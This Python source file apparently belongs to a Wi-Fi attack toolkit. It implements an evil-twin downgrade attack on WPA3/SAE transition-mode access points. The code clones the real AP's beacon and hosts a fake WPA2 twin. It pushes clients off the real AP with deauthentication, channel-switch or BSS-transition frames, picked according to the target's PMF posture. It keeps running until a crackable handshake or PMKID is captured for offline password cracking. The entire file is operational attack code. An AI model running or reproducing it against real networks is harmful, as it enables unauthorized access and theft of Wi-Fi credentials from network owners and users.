"""EvilTwin: downgrade attack against WPA3/SAE transition-mode APs. Punt the client onto a WPA2-PSK
twin so it re-associates with PSK (a crackable M2) instead of SAE.
"""
from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass
from typing import Optional

from wifit3.dot11 import str_to_mac
from wifit3.dot11.ap import beacon_clone
from wifit3.dot11.csa import build_csa_beacon
from wifit3.crack.handshake import crackable_pairs, pmkid_crackable
from wifit3.campaigns.campaign import Campaign
from wifit3.campaigns.eviltwin.fake_ap import FakeAP
from wifit3.campaigns.eviltwin.punter import Punter, PuntMode, BURST_SIZE, FRAME_GAP_SEC

logger = logging.getLogger(__name__)

_POLL_SEC = 0.25


def csa_target_channel(ap_channel: int, preferred: Optional[int] = None) -> int:
    """``preferred`` when set and not ``ap_channel``, else a valid decoy in the AP's own band it isn't
    on (a CSA to ``ap_channel`` itself does nothing, so ``preferred == ap_channel`` also falls back)."""
    if preferred is not None and preferred != ap_channel:
        return preferred
    if ap_channel > 14:                       # 5GHz
        return 40 if ap_channel == 36 else 36
    return 6 if ap_channel == 1 else 1


def default_punt_modes(ap) -> tuple[PuntMode, ...]:
    """Techniques checked by default for the target's PMF posture: PMF-Required blocks the
    robust-frame punts (deauth + BTM), leaving CSA; otherwise all three."""
    if ap.pmf_required:
        return (PuntMode.CSA,)
    return (PuntMode.DEAUTH, PuntMode.CSA, PuntMode.BTM)


@dataclass(frozen=True)
class EvilTwinInput:
    """The modal's output: which interfaces host and punt, and how."""
    twin_iface: object
    punt_iface: object                       # may equal twin_iface (single-card)
    twin_channel: int
    twin_bssid: str                          # the twin's BSSID; equal to the target's spoofs it
    punt_modes: tuple[PuntMode, ...] = ()    # enabled eviction techniques; empty = host only
    csa_channel: Optional[int] = None        # None resolves off the twin channel (see _make_punter)
    punt_period_sec: Optional[float] = 30.0  # None never punts (host only)
    punt_once: bool = False


class EvilTwinCampaign(Campaign):
    button_id = "btn-eviltwin"
    key = "eviltwin"
    idle_label = "EvilTwin"
    run_label = "Stop EvilTwin"
    idle_variant = "primary"
    run_variant = "error"

    @classmethod
    def visible(cls, ap) -> bool:
        return bool(ap.ssid) and bool(ap.akm_suites)

    @classmethod
    def ineligible_reason(cls, ap) -> Optional[str]:
        if not ap.last_beacon_frame:
            return "no beacon captured yet"
        return None

    def __init__(self, array, target, evil_input: EvilTwinInput):
        if not target.last_beacon_frame:
            raise ValueError("EvilTwin needs a captured beacon to clone; none seen yet.")
        if not target.ssid:
            raise ValueError("EvilTwin needs a known SSID: target is hidden.")
        super().__init__(ap=target, array=array)
        self.ssid = target.ssid
        self.target_channel = target.channel
        self.twin_iface = evil_input.twin_iface
        self.punt_iface = evil_input.punt_iface
        self.twin_channel = evil_input.twin_channel
        self.twin_bssid = evil_input.twin_bssid.lower()
        self.same_bssid = self.twin_bssid == target.bssid
        self.punt_period_sec = evil_input.punt_period_sec
        self.punt_once = evil_input.punt_once
        self.real_beacon = target.last_beacon_frame
        self.twin_beacon = beacon_clone(self.real_beacon, self.twin_channel,
                                        None if self.same_bssid else str_to_mac(self.twin_bssid))
        self.punter = self._make_punter(evil_input, target.bssid)
        self.fakeap: Optional[FakeAP] = None
        self.captured = False

    def _make_punter(self, evil_input: EvilTwinInput, target_bssid: str) -> Optional[Punter]:
        if not evil_input.punt_modes:
            return None
        csa_channel = csa_target_channel(self.target_channel, evil_input.csa_channel or self.twin_channel)
        return Punter(evil_input.punt_modes, self.real_beacon, str_to_mac(target_bssid), csa_channel,
                      str_to_mac(self.twin_bssid), self.twin_channel, self.target_channel)

    async def _loop(self) -> None:
        self.fakeap = FakeAP(self.twin_iface, str_to_mac(self.twin_bssid), self.ssid,
                             self.twin_channel, self.twin_beacon, rx_source=self.twin_iface,
                             record_m1=self.array.record_injected_eapol)
        if self.same_bssid:
            self.array.ignore_stray_beacons(self.twin_bssid, self.twin_channel)
        else:
            self.array.mark_evil_twin(self.twin_bssid)
        await self.fakeap.start()
        if (self.punt_iface is not self.twin_iface
                and self.punt_iface.current_channel != self.target_channel):
            await self.punt_iface.set_channel(self.target_channel)

        punted = False
        while not self.stopped:
            if self._has_crackable_capture():
                self.captured = True
                break
            if self._should_punt(punted):
                await self.punter.punt(self.punt_iface, self._target_clients())
                punted = True
            await self._sleep_between_bursts(self.punt_period_sec or _POLL_SEC)

    def _target_clients(self) -> list[bytes]:
        """MACs associated to the real target AP: the STAs a BTM punt steers to the twin."""
        target = self.ap.bssid.lower()
        return [str_to_mac(c.mac) for c in self.array.clients.values()
                if (c.bssid or "").lower() == target]

    def _should_punt(self, already_punted: bool) -> bool:
        if self.punter is None or self.punt_period_sec is None:
            return False
        return not (self.punt_once and already_punted)

    async def _sleep_between_bursts(self, seconds: float) -> None:
        """Sleep up to ``seconds``, waking early on stop or a capture."""
        elapsed = 0.0
        while elapsed < seconds and not self.stopped and not self._has_crackable_capture():
            await asyncio.sleep(_POLL_SEC)
            elapsed += _POLL_SEC

    def _has_crackable_capture(self) -> bool:
        # Twin BSSID holds our forged M2; the target BSSID holds any real 4-way / PMKID after a punt.
        for bssid in {self.twin_bssid, self.ap.bssid.lower()}:
            ap = self.array.access_points.get(bssid)
            if ap and any(crackable_pairs(hs) or (hs.pmkid and pmkid_crackable(hs))
                          for hs in ap.handshakes.values()):
                return True
        return False

    async def teardown(self) -> None:
        if self.fakeap is None:
            return
        try:
            await self.fakeap.stop()      # stop the WPA2 beacon + responder first
            await self._csa_return()      # then announce the switch-back, uninterleaved
        finally:
            if self.same_bssid:
                self.array.stop_ignoring_stray_beacons(self.twin_bssid)
            await self.twin_iface.set_channel(self.target_channel)

    async def _csa_return(self) -> None:
        """CSA the twin-channel clients back to the target's channel."""
        if self.twin_channel == self.target_channel:
            return
        frame = build_csa_beacon(self.twin_beacon, self.target_channel, from_channel=self.twin_channel)
        for _ in range(BURST_SIZE):
            await self.twin_iface.send_no_wait(frame)
            await asyncio.sleep(FRAME_GAP_SEC)
